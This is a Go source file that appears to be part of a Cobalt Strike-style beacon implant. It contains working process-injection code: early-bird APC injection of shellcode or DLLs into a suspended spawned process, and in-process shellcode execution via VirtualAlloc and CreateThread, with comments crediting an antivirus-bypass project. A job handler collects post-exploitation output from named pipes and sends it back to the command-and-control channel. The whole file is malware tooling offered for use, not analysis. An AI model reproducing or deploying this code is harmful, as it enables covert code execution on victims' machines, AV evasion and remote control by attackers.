package command

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
	"io"
	"main/config"
	"main/packet"
	"main/sysinfo"
	"strings"
	"time"
	"unsafe"
)

var (
	kernel32            = windows.NewLazySystemDLL("kernel32.dll")
	ntdll               = windows.NewLazyDLL("ntdll.dll")
	VirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx    = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC        = kernel32.NewProc("QueueUserAPC")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	VirtualProtect      = kernel32.NewProc("VirtualProtect")
	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

// implement of beacon.Job

func InjectDllSelfX86(dll []byte) error {
	if sysinfo.IsProcessX64() {
		return errors.New("can not inject x86 dll into x64 beacon")
	} else {
		return InjectSelf(dll)
	}
}

func InjectDllSelfX64(dll []byte) error {
	if !sysinfo.IsProcessX64() {
		return errors.New("can not inject x64 dll into x86 beacon")
	} else {
		return InjectSelf(dll)
	}
}

// you should ensure x86 shellcode inject to x86 process
func GetSpawnProcessX86() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := config.SpawnToX86
		arr = strings.SplitN(path, " ", 1)
	} else {
		path := strings.Replace(config.SpawnToX86, "syswow64", "system32", 1)
		arr = strings.SplitN(path, " ", 1)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func GetSpawnProcessX64() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := strings.Replace(config.SpawnToX64, "sysnative", "system32", 1)
		arr = strings.SplitN(path, " ", 1)
	} else {
		path := config.SpawnToX64
		arr = strings.SplitN(path, " ", 1)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func SpawnAndInjectDllX64(dll []byte) error {
	program, args := GetSpawnProcessX64()
	err := SpawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func SpawnAndInjectDllX86(dll []byte) error {
	program, args := GetSpawnProcessX86()
	err := SpawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func SpawnAndInjectDll(dll []byte, program string, args string) error {
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	return CallUserAPC(procInfo, dll)
}

// copy from GolangBypassAV EarlyBird
func CallUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	_, _, err := QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if err != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling QueueUserAPC:\n%s", err.Error()))
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		return errors.New(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return errors.New(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
	}
	return nil
}

// copy from GolangBypassAV CreateThreadNative
func InjectSelf(shellcode []byte) error {
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		return errors.New("[!]VirtualAlloc failed and returned 0")
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}

	//var lpThreadId uint32
	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
	}
	return nil
}

func HandlerJob(b []byte) error {
	buf := bytes.NewBuffer(b)
	// read first zero bytes
	_, _ = ParseAnArg(buf)
	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	callbackType := packet.ReadShort(callbackTypeByte)

	sleepTime := packet.ReadShort(sleepTimeByte)
	pipeName, _ := ParseAnArg(buf)
	// command type, seems useless?
	_, _ = ParseAnArg(buf)
	// sleep time is 30000, I think it's too big, so just set time unit microsecond
	time.Sleep(time.Microsecond * time.Duration(sleepTime))
	result, err := ReadNamedPipe(pipeName)
	if err != nil {
		return err
	}
	finalPacket := packet.MakePacket(int(callbackType), []byte(result))
	packet.PushResult(finalPacket)
	return nil
}

func ReadNamedPipe(pipeName []byte) (string, error) {
	pipe, err := winio.DialPipe(string(pipeName), nil)
	if err != nil {
		return "", err
	}
	defer pipe.Close()
	result := ""
	buf := make([]byte, 512)
	for {
		n, err := pipe.Read(buf)
		if err != nil {
			if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
				fmt.Printf("read error: %v\n", err)
			}
			break
		}
		result += string(buf[:n])
	}
	return result, nil
}
